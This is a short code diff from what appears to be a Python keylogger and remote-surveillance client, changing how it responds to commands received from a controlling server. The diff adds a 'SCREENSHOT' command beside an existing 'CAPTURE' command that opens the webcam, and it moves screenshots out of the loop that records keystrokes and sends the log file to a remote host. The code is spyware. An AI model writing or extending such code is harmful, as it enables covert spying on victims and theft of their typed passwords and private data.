@@ -102,6 +102,8 @@ def receive_server_commands(host, port):
                 command = client_socket.recv(1024).decode()
                 if command == 'CAPTURE':
                     open_webcam()
+                elif command == 'SCREENSHOT':
+                    take_screenshot(host, port)
             except socket.error:
                 print('Error receiving command from server')
 
@@ -114,7 +116,6 @@ def start_listener(filename, host, port, capture_duration, delay_send_log, last_
                 time.sleep(delay_send_log)
                 listener.stop()
                 last_position = send_log_file(filename, host, port, last_position)
-                take_screenshot(host, port)
                 listener = Listener(on_press=listen_keyboard)
                 listener.start()
         except KeyboardInterrupt:
